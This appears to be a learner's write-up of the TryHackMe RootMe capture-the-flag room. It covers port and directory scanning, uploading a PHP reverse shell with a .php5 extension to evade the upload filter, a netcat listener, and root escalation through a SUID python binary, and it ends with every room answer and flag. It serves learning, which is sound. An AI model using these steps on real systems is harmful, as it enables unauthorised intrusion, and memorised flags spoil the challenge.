# Day-10: TryHackMe Room (RootMe)

## Overview

Today, I completed the RootMe room on TryHackMe. This room is a beginner-friendly Capture The Flag (CTF) challenge that involves exploiting a vulnerable web application to gain root access.

## Key Learnings

1. **Bugcrowd**: An online platform that connects ethical hackers with organizations to identify and resolve security vulnerabilities.
2. **Directory Traversal**: A web security vulnerability that allows attackers to access restricted directories and execute commands outside of the web server's root directory.
3. **DNSLeakTest.com**: A tool to check whether your DNS queries are leaking out of your VPN tunnel.
4. **Scamalytics.com**: A website that provides information on the trustworthiness and risk level of IP addresses, useful for identifying potential scams and frauds.

## Steps and Commands 

### 1. Deploy the machine
 Refer to this repo for the [How to connect tryhackme to kali linux](https://github.com/Heartking-2324/Cybersecurity-90days_notes/tree/main/Day-07)
### 2. Reconnaissance
``` nmap -sV ip_addr ```
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mKRmhlvzEuvp-DVMiHJQRA.png)
```
ssh — service that enables secure connection between devices
http — a web server running Apache httpd 2.4.29
```
Gobuster 
``` gobuster dir -u <ip_addr> -w /root/Dekstop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt ```

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*lYpZXnvY6_Ll9p9t1J2MAg.png)

### 3. Getting a shell 
Connect via the ip_address and the the directory which we found in the gobuster 
``` Open web browser, type <ip_addr>/panel/ ```

To connect via the reverse shell connection to the website 
The online tool called the pentestmonkey Download it with this command 
``` wget https://github.com/pentestmonkey/php-reverse-shell ``` 
``` nano shell.php ``` 

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*bBVrHSvg65nU3hx-wL8NKQ.png)

The change this we have to add our ip_address with the tun0 we can get this by command ``` ifconfig ``` 

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*bBVrHSvg65nU3hx-wL8NKQ.png)

With brupsuit we find the extention of the php which can bypass the validation of the uploads we find the all the php extention available. 
```  .php3, .php4, .php5, .php7, .pthml, .pht. ```

This is trial and error now, we need to see which one will be accepted. We need to simply edit the extension. I have changed the extension to .php5 and it was accepted by the server.

Now we need to go to ip_addr/uploads/ and also start our netcat listener in the terminal. 

Where in my case php5 extention worked 
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*X7lkSZU-VbhWANzdG9hplg.png)

How to start a netcat listener? open terminal and type nc -lvnp 1234 (the port number that was edited in your php reverse shell file).
``` nc -lvnp port ```

Now with the directory finding command in terminal we search for the user.txt
``` find / -type f -name user.txt 2> /dev/null ```

After that we just find the 
``` cat /var/www/user.txt ```
``` THM{y0u_g0t_a_sh3ll} ```

### 4. Privilege Escalation
``` find / -user root -perm /4000 ```
With this command we find a file with SUID permission that can be run as root. 
We need to look carefully into the output of the command to find which file can be exploited to gain root access.

``` /usr/bin/python ```
How to exploit it? Go to GTFOBins https://gtfobins.github.io/ and look for Python GTFO. We need this one :
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UD3MWoyvik2WsVj7NWJdOQ.png)

``` python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ```

We need to run the second part of the command here. Type whoami to get confirmation that we indeed are a root user now. 
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*VN-9u5ml-FeWn0jgwdfh6Q.png)

To find the root.txt run this command in the terminal
```
 find / -type f -name root.txt 
 cat /root/root.txt
```
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*CO1eLu6CbTgb1uUMhMBntQ.png)

``` THM{pr1v1l3g3_3sc4l4t10n} ```


## The all answer of room activity 
### Task2 
Scan the machine, how many ports are open?

``` 2 ```

What version of Apache is running?

``` 2.4.29 ```

What service is running on port 22?

``` ssh ```

What is the hidden directory?

``` /panel/ ```

### Task3

user.txt

``` THM{y0u_g0t_a_sh3ll} ```

### Task4 

Search for files with SUID permission, which file is weird?

``` /usr/bin/python ```

root.txt

``` THM{pr1v1l3g3_3sc4l4t10n} ```

## Conclusion

This room provided a solid understanding of basic web exploitation and privilege escalation techniques. The hands-on experience was invaluable for reinforcing the theoretical knowledge gained.
